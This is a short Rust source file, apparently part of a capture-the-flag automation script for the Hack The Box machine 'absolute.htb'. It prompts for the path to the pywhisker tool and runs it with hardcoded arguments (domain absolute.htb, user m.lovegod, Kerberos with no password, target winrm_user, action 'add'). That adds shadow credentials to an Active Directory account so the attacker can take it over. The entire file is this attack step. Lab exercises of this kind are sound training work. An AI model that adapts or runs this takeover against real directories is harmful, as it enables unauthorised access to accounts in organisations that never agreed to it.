use std::process::Command;
use std::io;

pub fn run () {
    println!("Running pywhisker...");
    run_pywhisker(); 
}

fn run_pywhisker() {
    // Prompt the user for the location of pywhisker.py
    println!("Please enter the path to pywhisker.py:");
    let mut pywhisker_path = String::new();
    io::stdin()
        .read_line(&mut pywhisker_path)
        .expect("Failed to read input");

    let pywhisker_path = pywhisker_path.trim();

    // Prepare and run the command with the specified arguments
    let output = Command::new("python3")
        .arg(pywhisker_path)
        .arg("-d")
        .arg("absolute.htb")
        .arg("-u")
        .arg("m.lovegod")
        .arg("-t")
        .arg("winrm_user")
        .arg("-k")
        .arg("--no-pass")
        .arg("--action")
        .arg("add")
        .output()
        .expect("failed to execute pywhisker.py");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}
